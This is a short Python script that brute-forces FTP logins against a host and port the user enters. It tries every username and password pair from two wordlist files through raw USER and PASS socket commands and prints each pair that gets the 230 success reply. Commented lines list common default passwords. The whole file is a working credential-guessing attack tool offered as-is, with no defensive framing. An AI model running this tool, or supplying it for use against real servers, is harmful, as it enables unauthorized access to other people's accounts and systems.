import socket
import re
import sys

#url = input('Enter a address: ')
#port = input('Enter a port: ')

def connect(username,password):
    mysock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print('[*] Checking ' + username + ':' + password)
    mysock.connect((url,int(port)))
    data = mysock.recv(1024).decode()
    resend = 'USER ' + username + '\r\n'
    mysock.send(resend.encode())
    data = mysock.recv(1024).decode()
    resend = 'PASS ' + password + '\r\n'
    mysock.send(resend.encode())
    data = mysock.recv(3).decode()
    mysock.send('QUIT \r\n'.encode())
    mysock.close()
    return data

url = input('Enter a address(IP): ')
port = input('Enter a port: ')

usernames = open('username.txt')
#passwords = ['123','ftp','root','admin','hellotest','toor']
#passwords = open('passwords.txt') # the same file
logsu = dict()
for username in usernames:
    username = username.strip('\n')
    passwords = open('passwords.txt')
    for password in passwords:
        password = password.strip('\n')
        attempt = connect(username,password)
        if attempt == '230' :
            print('[*] login success. ' + username + ':' + password)
            logsu[username] = password
for username in logsu:
    print('\r\n[*] login success : ' + username + ':' + logsu[username])
sys.exit(0)
